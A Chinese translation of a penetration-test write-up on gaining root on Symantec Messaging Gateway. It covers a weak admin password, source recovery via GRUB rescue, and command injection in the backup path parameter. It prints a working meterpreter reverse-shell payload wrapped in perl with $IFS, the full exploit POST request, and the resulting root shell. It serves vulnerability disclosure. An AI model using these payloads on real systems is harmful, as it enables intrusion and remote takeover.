> 原文链接: https://www.anquanke.com//post/id/86268 


# 【技术分享】如何攻击Symantec Messaging Gateway：从弱口令到远程代码执行


                                阅读量   
                                **106495**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：pentest.blog
                                <br>原文地址：[https://pentest.blog/unexpected-journey-5-from-weak-password-to-rce-on-symantec-messaging-gateway/](https://pentest.blog/unexpected-journey-5-from-weak-password-to-rce-on-symantec-messaging-gateway/)

译文仅供参考，具体内容表达以及含义原文为准

****

[![](https://p4.ssl.qhimg.com/t01fce1b12d1d5a735d.jpg)](https://p4.ssl.qhimg.com/t01fce1b12d1d5a735d.jpg)

翻译：[興趣使然的小胃](http://bobao.360.cn/member/contribute?uid=2819002922)

预估稿费：200RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**一、前言**

如果你一直在关注我们的博客，你肯定会对我们撰写的“[意外之旅](https://pentest.blog/article-series/)”系列文章非常熟悉。在本文中，我会跟大家分享我们在实际生活中对Symantec Messaging Gateway的渗透测试经验，最终任务是实现目标系统上系统命令的远程执行。

<br>

**二、初始阶段：枚举可用信息**

枚举始终是最为关键的环节！针对客户的IP地址范围，我分别执行了DNS枚举、Google查询以及Nmap扫描。此外，我还在公开泄露数据源以及我们内部研发的密码数据库中搜索了目标公司的邮件信息。最终我找到了2个不同的凭证信息，其中1个凭证信息在2个月之前被录入到我们的内部数据库中。

当我对Nmap的扫描结果分析完毕之后，我发现客户的Symantec Messaging Gateway管理接口正公开暴露在互联网中。我使用Google搜索引擎，找到厂商提供的管理文档，查询这款产品的默认用户名。根据厂商说明，产品的默认用户名为admin，但密码需要用户在安装过程中单独指定。

因此我们的问题就转化为找出admin用户的密码！我准备尝试以下动作：

1、对公开泄露数据源中的哈希进行暴力破解，尝试通过Exchange服务器提供的OWA接口登录邮箱账户。然后挖掘所有可用的邮件信息，找出可能的密码。

2、对诸如admin、123456等的弱口令进行暴力破解。

实话实说，第二种办法相当奏效。实际使用的密码为Passw0rd，大写的P，数字0。这个密码是我手动试出来的，因为大多数IT员工在设置账户密码时需要包含至少1位大写字母以及1个数字，以满足域控的密码策略。出于这个原因，他们通常会使用这种组合来创建密码。

这个时刻对我们来说是一个“幸运时刻”。我们成功获取了Symantec Messaging Gateway网页入口的访问权限，但我还是想要获得更多突破！现在，我已踏上征途，开始探索。

<br>

**三、前提假设**

在开始分析目标产品的漏洞信息之前，我有如下几点假设：

1、产品使用ISO/OVA文件进行分发。

2、产品由著名的安全公司所生产，因此很难挖掘出重要的信息？（希望不要是这种情况）

3、产品的安全加固等级如同地狱一般严峻。

4、产品使用了非常复杂的应用架构。

我从官方页面下载了一个包含30天许可证的试用版产品。

<br>

**四、拆解Symantec Messaging Gateway**

安装完毕后，我发现Symantec Messaging Gateway使用了如下加固保护措施：

1、严格限制的shell。我可以通过SSH接口访问目标设备，但只能获取一个受限的shell。此外，目标主机上只开放了80及443端口。

2、目标对GRUB密码做了防护。

**4.1 操作阶段：源代码**

我需要访问管理接口的源代码，但因为受限shell的原因，我不能使用SSH接口。我可以考虑查找突破受限shell的方法，但这一过程可能会花费太多时间。因此，我决定采用如下步骤：

1、使用CentOS镜像启动目标虚拟机（因为该产品同样使用了CentOS）。

2、从镜像中选择“Rescue installed system”选项。

3、等待一段时间，直至启动过程结束。

4、打开“/mnt/sysimage/boot/grub.conf”文件，删除GRUB密码保护那一行。

5、使用Vmware选项卸载光盘镜像。

6、重启目标主机。

[![](https://p5.ssl.qhimg.com/t0164605a57ff3d3f0e.png)](https://p5.ssl.qhimg.com/t0164605a57ff3d3f0e.png)

启用GRUB密码保护的那一行

**4.1.1 以root身份访问**

通过grub菜单，我成功以单用户模式启动了目标主机，在这一模式下，我们可以直接获得root权限的shell，同时不启动任何服务。我原本打算禁用admin用户的受限shell，但后来还是决定使用其他的办法来解决这一问题。我修改了sshd_config文件，以便启用root用户访问功能，同时修改了root用户的密码。

再次启动目标主机。

**4.1.2 探测并收集服务信息**

我们能够以root身份，通过SSH接口访问目标主机，这意味着我们可以收集该产品的更多信息。我对目标主机做了一次NMAP扫描，扫描结果如下：



```
➜  ~ sudo nmap -sS -sV -p - --open 12.0.0.199 -Pn -n
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 5.3 (protocol 2.0)
25/tcp    open  smtp        Symantec Messaging Gateway smtpd
443/tcp   open  ssl/http    Apache Tomcat/Coyote JSP engine 1.1
8443/tcp  open  ssl/http    Apache Tomcat/Coyote JSP engine 1.1
41002/tcp open  ssl/unknown
41015/tcp open  smtp        Symantec Messaging Gateway smtpd
41016/tcp open  smtp        Symantec Messaging Gateway smtpd
41017/tcp open  smtp        Symantec Messaging Gateway smtpd
41025/tcp open  smtp
41443/tcp open  ssl/http    Apache Tomcat/Coyote JSP engine 1.1
```

443、8443以及41443端口：与管理接口相关的服务。

41015-41025端口：这个产品的设计初衷就是用于email分析的，因此开放这些端口很正常。

41002端口：这是什么鬼？

这个端口非常有趣，我们需要找出目标主机开放这个服务的目的。



```
[root@hacker ~]# netstat -tnlp |grep 41002
tcp        0      0 0.0.0.0:41002               0.0.0.0:*                   LISTEN      2560/bmagent
[root@hacker ~]# 
[root@hacker ~]# ps aux|grep 2560
mailwall   2560  0.0  0.3 550428 12816 ?        Sl   12:35   0:00 /opt/Symantec/Brightmail/scanner/sbin/bmagent -c /data/scanner/etc/agentconfig.xml
[root@hacker ~]# 
[root@hacker ~]# file /opt/Symantec/Brightmail/scanner/sbin/bmagent
```

/opt/Symantec/Brightmail/scanner/sbin/bmagent: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.18, not stripped

根据以上结果，我们可以知道是谁在监听这个端口。我使用netstat命令找出负责这个服务的具体程序，然后通过grep命令，找到程序具体执行的命令。最后一步，我使用file命令观察该文件是脚本文件还是二进制文件等信息。



```
[root@hacker ~]# cat /data/scanner/etc/agentconfig.xml
&lt;?xml version="1.0"?&gt;
&lt;!-- Default agent configuration file for brightmail --&gt;
&lt;!-- InstallAnywhere Macros inserted --&gt;
&lt;installation xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" version="6.0.0.0"&gt;
    &lt;configdir&gt;/data/scanner/etc&lt;/configdir&gt;
    &lt;mtalogfile&gt;/data/logs/maillog&lt;/mtalogfile&gt;
    &lt;packages&gt;
        &lt;package name="agentPackage" installed="true" enabled="true"/&gt;
    &lt;/packages&gt;
    &lt;programs&gt;
        &lt;program xsi:type="agentType" name="agent"&gt;
            &lt;log level="4" period="1" periodUnits="DAY" numberRetained="30"&gt;/data/logs/scanner/agent_log&lt;/log&gt;
            &lt;networkAddress host="*" port="41002"/&gt;
            &lt;allowedIPs&gt;&lt;allowedIP&gt;127.0.0.1&lt;/allowedIP&gt;
&lt;allowedIP&gt;12.0.0.199&lt;/allowedIP&gt;
&lt;allowedIP&gt;1.1.1.1&lt;/allowedIP&gt;
&lt;allowedIP&gt;1.1.1.2&lt;/allowedIP&gt;
&lt;allowedIP&gt;1.1.1.3&lt;/allowedIP&gt;&lt;/allowedIPs&gt;
            &lt;ssl certFile="/data/scanner/etc/agent.cert" keyFile="/data/scanner/etc/agent.key"/&gt;
        &lt;/program&gt;
    &lt;/programs&gt;
&lt;/installation&gt;
```

以上是配置文件的具体内容。虽然该软件在所有的网络接口上运行相关服务，但我们只能通过白名单IP地址来访问这个服务。让我们记住这一点，然后继续探索。

**4.1.3 定位源代码**

找到源代码的具体位置对我来说不是件难事。通过若干命令，就能找出Web服务所在的进程ID，以及启动该服务所执行的具体指令，如下所示。



```
[root@hacker ~]# netstat -tnlp |grep 443
tcp        0      0 :::41443                    :::*                        LISTEN      2632/jsvc.exec      
tcp        0      0 :::8443                     :::*                        LISTEN      2632/jsvc.exec      
tcp        0      0 :::443                      :::*                        LISTEN      2632/jsvc.exec      
[root@hacker ~]# 
[root@hacker ~]# ps aux|grep 2632
bcc        2632  2.1 13.8 3482224 541216 ?      Sl   12:35   0:44 jsvc.exec -user bcc -home /usr/java/latest -wait 1200 -pidfile /var/run/jsvc.pid -outfile /data/logs/bcc/catalina.out -errfile &amp;1 -Xmx800M -XX:MaxPermSize=128m -Djvm=bcc -Djava.awt.headless=true -Djava.util.logging.config.file=/data/bcc/conf/logging.properties -Dorg.apache.jasper.compiler.Parser.STRICT_QUOTE_ESCAPING=false -Dorg.apache.el.parser.SKIP_IDENTIFIER_CHECK=true -Dcatalina.base=/data/bcc -Dcatalina.home=/usr/share/apache-tomcat-7.0.62 -Djava.io.tmpdir=/data/bcc/temp -cp /usr/share/java/commons-daemon.jar:/usr/share/apache-tomcat-7.0.62/bin/bootstrap.jar:/usr/share/apache-tomcat-7.0.62/bin/tomcat-juli.jar org.apache.catalina.startup.Bootstrap
root       8106  0.0  0.0 103312   856 pts/0    S+   13:10   0:00 grep 2632
[root@hacker ~]#
```

从上述输出信息中，我发现貌似有个用户名为bcc。果不其然，我在“/data/bcc”这个文件夹中找到了管理接口的全部源代码。

我压缩了整个文件夹，然后通过SCP将源代码压缩包拷贝出来。

**4.2 追踪未知服务**

现在我们已经拿到了源代码，我们还需要知道某个服务的目的。我使用jd-gui工具，深入分析了程序的JAVA源码，这个工具也是我最喜欢的java反编译器。

根据前面情况可知，这个服务只能通过白名单IP地址来访问。这意味着，源代码中肯定使用的是127.0.0.1这个地址，没有使用服务器所在的IP地址。此外，127.0.0.1也是第一个白名单IP地址。

我在源代码中搜索127.0.0.1这个字符串，并在backupNow函数中找到如下代码片段：



```
try
    `{`
      if (this.log.isInfoEnabled()) `{`
        this.log.info(this.rb.getLocalizedMessage("information.agent.script.databaseBackup.start"));
      `}`
      String scriptName = NameHelper.getDbBackup();
      AgentResultTO result = ScriptHelper.executeScript("127.0.0.1", 41002, scriptName, 
        ScriptParamFactory.createAgentParam(params), 2, AgentSettingsDAO.TimeoutLength.Infinite);
      if (this.log.isInfoEnabled()) `{`
        this.log.info(this.rb.getLocalizedMessage("information.agent.script.databaseBackup.end"));
      `}`
      if (result.isError())
      `{`
        String message = ScriptHelper.decodeMessage(result);
        ScriptHelper.logError("error.agent.script.databaseBackup", message);
        ScriptHelper.generateError("error.agent.script.databaseBackup", message);
      `}`
    `}`
    catch (BrightmailException e)
    `{`
      ScriptHelper.generateError("error.agent.script.databaseBackup", e.getMessage());
    `}`
```

这正是我想要看到的代码。应用程序将脚本名及参数作为数据发送给服务。让我们来找找哪个脚本会被执行。从代码中可知，scriptName参数的值由getDbBackup函数的返回值来决定。



```
public static String getDbBackup()
`{`
  if (dbBackup == null)
  `{`
    StringBuilder builder = new StringBuilder(25);
    builder.append("$SCRIPTSDIR$$/$");
    builder.append("db-backup");
    dbBackup = builder.toString();
  `}`
  return dbBackup;
`}`
```

非常棒，现在我们知道了哪个脚本或者程序会被执行，让我们来找到它。



```
[root@hacker bcc]# find /opt/ -type f|grep 'db-backup'
/opt/Symantec/Brightmail/cli/bin/db-backup
/opt/Symantec/Brightmail/cli/sbin/db-backup
/opt/Symantec/Brightmail/cli/man/man1/db-backup.1
[root@hacker bcc]# 
[root@hacker bcc]# cat /opt/Symantec/Brightmail/cli/bin/db-backup
#!/bin/sh
. /data/scanner/etc/brightmail-env
/usr/bin/sudo /opt/Symantec/Brightmail/cli/sbin/db-backup "$@"
```

事情变得越来越有趣。当某个任务由该服务启动后，这个任务会执行一个db-backup bash脚本，这个脚本会使用sudo命令执行另外一个命令。

现在是时候找出执行这个流程的最终要素了。感谢strust.xml文件的帮助，我们借此能找出哪个URL被映射到哪个类和方法上。xml文件的定义如下所示：



```
&lt;action path="/backup/add" forward="/backup/action2.do?method=add"/&gt;
&lt;action path="/backup/edit" forward="/backup/action2.do?method=edit"/&gt;
&lt;action path="/backup/backupNow" forward="/backup/action2.do?method=showBackupNow"/&gt;
&lt;action path="/backup/action2"
        type="com.symantec.smg.controlcenter.disasterrecovery.backup.BackupAction"
        name="backupForm"
        scope="request"
        parameter="method"
        validate="false"
        input="/admin_backup_restore.jsp"&gt;
  &lt;forward name="success" path="/admin_backup_edit.jsp"/&gt;
&lt;/action&gt;
```

这意味着我们可以通过“/brightmail/admin/backup/backupNow.do”来执行这个流程。在应用软件中，与之对应的屏幕截图如下所示。

[![](https://p2.ssl.qhimg.com/t014d7f588f5b9af131.png)](https://p2.ssl.qhimg.com/t014d7f588f5b9af131.png)

现在我们知道Symantec能够通过FTP或者SCP将备份文件存储到远程服务器上。由于这一过程通常耗时较长，因此他们决定通过后台任务方式执行这一过程，同时使用41002端口所对应的服务用来管理这类任务。让我们来重复这一过程，看看哪条命令会被执行。



```
[root@hacker bcc]# ps aux|grep 12.0.0.15
mailwall  11296  0.0  0.0 108204  1308 ?        S    13:37   0:00 /bin/sh /opt/Symantec/Brightmail/common/sbin/db-backup -f SCP://root:toor@12.0.0.15/tmp -t 1 -s manual
root      11297  0.0  0.0 175096  2672 ?        S    13:37   0:00 /usr/bin/sudo /opt/Symantec/Brightmail/cli/sbin/db-backup -f SCP://root:toor@12.0.0.15/tmp -t 1 -s manual
root      11298  5.0  0.5 173584 23132 ?        S    13:37   0:00 /usr/bin/perl -w /opt/Symantec/Brightmail/cli/sbin/db-backup -f SCP://root:toor@12.0.0.15/tmp -t 1 -s manual
root      11303  0.0  0.0  57244  2400 pts/2    Ss+  13:37   0:00 /usr/bin/scp -P 22 -q /data/tmp/db-backup.10.6.2-7.brightmail.Apr-26-17-13-37.tar root@12.0.0.15:/tmp.full.manual.tar.bz2
root      11304  0.0  0.0  59700  2952 pts/2    S+   13:37   0:00 /usr/bin/ssh -x -oForwardAgent no -oPermitLocalCommand no -oClearAllForwardings yes -p22 -q -lroot 12.0.0.15 scp -t /tmp.full.manual.tar.bz2
root      11307  0.0  0.0 103308   872 pts/0    S+   13:37   0:00 grep 12.0.0.15
[root@hacker bcc]#
```

非常棒！这个位置很有可能存在命令注入漏洞。你可以看到，我们通过Web界面设置的参数最终会被bmagent服务所使用，以便通过SSH方式传输文件。

让我们来看看哪个地方会对输入进行验证。我敢打赌，在输入被投递到bmagent服务之前，这个Web应用肯定会在某处对输入进行验证。

**4.3 找出存在漏洞的参数**

负责输入验证的代码如下：



```
if (storeRemoteBackup)
    `{`
      if (EmptyValidator.getInstance().isValid(remoteBackupAddress))
      `{`
        exceptionMsgKeys.add("error.backup.host.ip.required");
        focusElement = "remoteBackupAddress";
      `}`
      else if ((!DomainValidator.getInstance().isValid(remoteBackupAddress)) &amp;&amp; 
        (!RoutableIpValidator.getInstance().isValid(remoteBackupAddress)))
      `{`
        exceptionMsgKeys.add("error.backup.host.ip.invalid");
        focusElement = "remoteBackupAddress";
      `}`
      if (EmptyValidator.getInstance().isValid(port))
      `{`
        exceptionMsgKeys.add("error.backup.host.port.empty");
        focusElement = "remoteBackupPort";
      `}`
      else if (!TcpUdpPortValidator.getInstance().isValid(port))
      `{`
        exceptionMsgKeys.add("error.backup.host.port.invalid");
        focusElement = "remoteBackupPort";
      `}`
      String path = backupForm.get("remoteBackupPath").toString();
      if (EmptyValidator.getInstance().isValid(path))
      `{`
        exceptionMsgKeys.add("error.backup.path.empty");
        focusElement = "remoteBackupPath";
      `}`
      else
      `{`
        UsAsciiValidator v = UsAsciiValidator.getInstance();
        if (!v.isValid(path))
        `{`
          exceptionMsgKeys.add("error.backup.path.only.ascii.allowed");
          focusElement = "remoteBackupPath";
        `}`
      `}`
    `}`
```

验证过程使用了如下规则：

1、remoteBackupAddress不能为空。

2、remoteBackupAddress必须为可路由的IP地址。

3、端口（port）不能为空。

4、端口必须为有效的TCP和UDP端口。

5、路径（path）不能为空。

6、路径必须是ASCII字符串。

因此我们显然可以通过path参数实现命令注入。

**4.4 完成攻击任务**

我们可以通过以下步骤完成命令注入攻击任务。

1、使用有效凭证登陆应用。

2、转到“/brightmail/admin/backup/backupNow.do”。

3、选择“Store backup on a remote location”选项。

4、选择协议类型为SCP。

5、填入某个有效的SSH服务所对应的IP地址、端口信息。（你可以使用kali系统搭建这个服务）。

6、启用“Requires authentication”功能。

7、填入SSH服务所对应的用户名及密码信息。

8、将攻击载荷放在tmp参数上。不要忘了使用“$()”或者““”，这样才能执行命令注入攻击。

在我的测试过程中，我发现在载荷中使用空格符（SPACE）会导致某些环节崩溃，你可以使用$IFS来替换空格符。

**4.5 PoC**

我喜欢使用meterpreter，总是倾向于获取一个meterpreter shell，不喜欢获取cmd shell。我用来获取python版meterpreter的技巧如下。

首先，使用msfvenom来生成python版的载荷。



```
msfvenom -p python/meterpreter/reverse_tcp LHOST=12.0.0.1 LPORT=8081 -f raw
import base64,sys;exec(base64.b64decode(`{`2:str,3:lambda b:bytes(b,'UTF-8')`}`[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCcxMi4wLjAuMScsODA4MSkpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoZCx7J3MnOnN9KQo=')))
```

因此，我需要将载荷传递到python -c "PAYLOAD"命令中，但应用程序不允许使用空格符，因此我使用的是$`{`IFS`}`，这样一来，最终的载荷就变成python$`{`IFS`}`-v$`{`IFS`}`"PAYLOAD"。但问题在于我们的载荷内部还有一个空格符，位于import以及base64之间，并且$`{`IFS`}`是Linux可以用的一个小技巧，但对python来说并不适用！

现在是发挥创造力的时间了。我想到了一个主意。我可以使用perl载荷。因为根据我之前的经验，我可以创造一个不带有空格符的perl载荷。因此，我们可以构建一个perl载荷，利用这个载荷执行我们的meterpreter python载荷。

实现的方法如下：



```
cmd = "python -c "#`{`payload.encoded`}`""
final_payload = cmd.to_s.unpack("H*").first
p = "perl$`{`IFS`}`-e$`{`IFS`}`'system(pack(qq,H#`{`final_payload.length`}`,,qq,#`{`final_payload`}`,))'"
```

最终的载荷如下所示：

```
perl$`{`IFS`}`-e$`{`IFS`}`'system(pack(qq,H732,,qq,707974686f6e202d632022696d706f7274206261736536342c7379733b65786563286261736536342e6236346465636f6465287b323a7374722c333a6c616d62646120623a627974657328622c275554462d3827297d5b7379732e76657273696f6e5f696e666f5b305d5d28276157317762334a3049484e765932746c6443787a64484a315933514b637a317a62324e725a5851756332396a613256304b4449736332396a613256304c6c4e5051307466553152535255464e4b51707a4c6d4e76626d356c5933516f4b4363784d6934774c6a41754d5363734e4451304e436b70436d77396333527964574e304c6e56756347466a6179676e506b6b6e4c484d75636d566a646967304b536c624d46304b5a44317a4c6e4a6c5933596f62436b4b6432687062475567624756754b4751705047773643676c6b4b7a317a4c6e4a6c5933596f624331735a57346f5a436b70436d56345a574d6f5a4378374a334d6e4f6e4e394b516f3d2729292922,))')
```

这是一个包含python版meterpreter载荷的perl载荷。现在是时候搞定shell了。我向服务器以HTTP方式发送如下POST请求，成功触发了漏洞：



```
POST /brightmail/admin/backup/performBackupNow.do HTTP/1.1
Host: 12.0.0.199:8443
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 1188
Referer: https://12.0.0.199:8443/brightmail/admin/backup/backupNow.do
Cookie: JSESSIONID=67376D92B987724ED2309C86990690E3; userLanguageCode=en; userCountryCode=US; navState=expanded%2Cexpanded%2Cexpanded%2Cexpanded%2Cexpanded%2Cexpanded%2Cexpanded%2Cexpanded%2Cexpanded%2Cexpanded%2Cexpanded%2Cexpanded%2Cexpanded%2Cexpanded%2Cexpanded%2Cexpanded%2Cexpanded%2Cexpanded%2Cexpanded%2Cexpanded%2Cexpanded; JSESSIONID=0360B579A58BBBB8D74FEE4767BCAC10
Connection: close
Upgrade-Insecure-Requests: 1
pageReuseFor=backup_now&amp;id=&amp;symantec.brightmail.key.TOKEN=48f39f735f15fcaccd0aacc40b27a67bf76f2bb1&amp;backupData=full&amp;customType=configuration&amp;includeIncidentMessages=true&amp;includeReportData=true&amp;includeLogData=true&amp;backupTo=2&amp;remoteBackupProtocol=SCP&amp;remoteBackupAddress=127.0.0.1&amp;remoteBackupPort=22&amp;remoteBackupPath=tmp$(perl$`{`IFS`}`-e$`{`IFS`}`'system(pack(qq,H732,,qq,707974686f6e202d632022696d706f7274206261736536342c7379733b65786563286261736536342e6236346465636f6465287b323a7374722c333a6c616d62646120623a627974657328622c275554462d3827297d5b7379732e76657273696f6e5f696e666f5b305d5d28276157317762334a3049484e765932746c6443787a64484a315933514b637a317a62324e725a5851756332396a613256304b4449736332396a613256304c6c4e5051307466553152535255464e4b51707a4c6d4e76626d356c5933516f4b4363784d6934774c6a41754d5363734e4451304e436b70436d77396333527964574e304c6e56756347466a6179676e506b6b6e4c484d75636d566a646967304b536c624d46304b5a44317a4c6e4a6c5933596f62436b4b6432687062475567624756754b4751705047773643676c6b4b7a317a4c6e4a6c5933596f624331735a57346f5a436b70436d56345a574d6f5a4378374a334d6e4f6e4e394b516f3d2729292922,))')&amp;requiresRemoteAuthentication=true&amp;remoteBackupUsername=root&amp;remoteBackupPassword=qwe123
```

漏洞触发过程如下所示：



```
msf exploit(handler) &gt; run
[*] Started reverse TCP handler on 12.0.0.1:4444 
[*] Starting the payload handler...
[*] Sending stage (39842 bytes) to 12.0.0.199
[*] Meterpreter session 2 opened (12.0.0.1:4444 -&gt; 12.0.0.199:54077) at 2017-04-30 17:03:26 +0300
meterpreter &gt; shell
Process 15849 created.
Channel 1 created.
sh: no job control in this shell
sh-4.1# id
uid=0(root) gid=0(root) groups=0(root)
sh-4.1#
```

我们在Symantec Messaging Gateway上获取了一个root权限的shell，然后继续渗透测试旅程。然而我不能与大家分享我们后续的渗透过程，因为这一过程包含客户的敏感信息。

**4.6 Metasploit模块**

我同样实现了一个metasploit模块，该模块的工作过程如下所示（gif动图）：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t018db835022e2c2931.png)

大家可以通过[此链接](https://github.com/rapid7/metasploit-framework/pull/8540)获取这个模块。

<br>

**五、时间线**

2017年4月24日：发现漏洞

2017年4月24日：在没有获得厂商支持的前提下，我们向PRODAFT GPACT成员们共享了漏洞的细节及应急补救方法。

2017年4月26日：第一次与厂商接触。

2017年5月2日：Symantec产品团队确认漏洞有效。

2017年5月25日：我们请求漏洞相关的更新信息。

2017年5月25日：Symantec回复说他们已经准备在6月份发布补丁，补丁发布时会通知我们。

2017年6月8日：我们的客户通知我们他们已经收到厂商的[更新通知](https://support.symantec.com/en_US/article.ALERT2377.html)。看样子Symantec在没有通知我们的前提下，就发布了10.6.3版本的更新版本，也没有通知我们对补丁有效性进行确认。

2017年6月10日：漏洞细节向公众公布。
